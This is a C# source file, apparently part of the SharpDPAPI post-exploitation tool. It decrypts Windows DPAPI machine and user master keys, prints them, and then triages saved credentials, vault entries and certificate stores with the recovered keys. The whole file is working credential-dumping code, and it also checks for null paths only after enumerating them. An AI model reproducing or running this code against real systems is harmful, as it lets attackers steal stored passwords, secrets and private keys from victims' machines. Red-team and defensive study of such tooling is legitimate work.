using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace SharpDPAPI
{
    public class SharpDPAPI
    {
        public static void ParseDpapi(StringBuilder sb, List<byte[]> Dpapikeys, List<byte[]> machineMasterKeys, List<byte[]> userMasterKeys, string credDirs = null, string vaultDirs = null, string certDirs = null)
        {
            sb.AppendLine("  [*] SYSTEM master key cache");
            Dictionary<string, string> mappings = DecryptSystemMasterKeys(sb, Dpapikeys, machineMasterKeys, userMasterKeys);
            foreach (KeyValuePair<string, string> kvp in mappings)
            {
                sb.AppendLine(String.Format("{0}:{1}", kvp.Key, kvp.Value));
            }
            var originalConsoleOut = Console.Out;
            using (var writer = new StringWriter())
            {
                Console.SetOut(writer);
                Console.WriteLine("  [*] Dpapi cred blobs");
                var credFiles = Directory.EnumerateFiles(credDirs, "*.*", SearchOption.AllDirectories);
                if (credDirs != null && credFiles.GetEnumerator().MoveNext())
                {
                    Triage.TriageCredFolder(credDirs, mappings);
                }

                var vaultFiles = Directory.EnumerateFiles(vaultDirs, "*.*", SearchOption.AllDirectories);
                if (vaultDirs != null && vaultFiles.GetEnumerator().MoveNext())
                {
                    foreach (var dir in Directory.GetDirectories(vaultDirs))
                    {
                        Triage.TriageVaultFolder(dir, mappings);
                    }
                }

                var certFiles = Directory.EnumerateFiles(certDirs, "*.*", SearchOption.AllDirectories);
                if (certDirs != null && certFiles.GetEnumerator().MoveNext())
                {
                    Triage.TriageCertFolder(certDirs, mappings);
                }
                writer.Flush();
                sb.AppendLine(writer.GetStringBuilder().ToString());
            }
            Console.SetOut(originalConsoleOut);
        }

        private static Dictionary<string, string> DecryptSystemMasterKeys(StringBuilder sb, List<byte[]> Dpapikeys, List<byte[]> machineMasterKeys = null, List<byte[]> userMasterKeys = null)
        {
            var mappings = new Dictionary<string, string>();
            if (machineMasterKeys != null)
            {
                foreach (byte[] masteyKeyBytes in machineMasterKeys)
                {
                    try
                    {
                        // use the "machine" DPAPI key
                        var plaintextMasterkey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, Dpapikeys[0]);
                        mappings.Add(plaintextMasterkey.Key, plaintextMasterkey.Value);
                    }
                    catch (Exception e)
                    {
                        sb.AppendLine(String.Format("[-] Error triaging {0} ", e.Message));
                    }
                }
            }
            if (userMasterKeys != null)
            {
                foreach (byte[] masteyKeyBytes in userMasterKeys)
                {
                    try
                    {
                        // use the "user" DPAPI key
                        var plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, Dpapikeys[1]);
                        mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
                    }
                    catch (Exception e)
                    {
                        sb.AppendLine(String.Format("[-] Error triaging {0} ", e.Message));
                    }
                }
            }
            return mappings;
        }
    }
}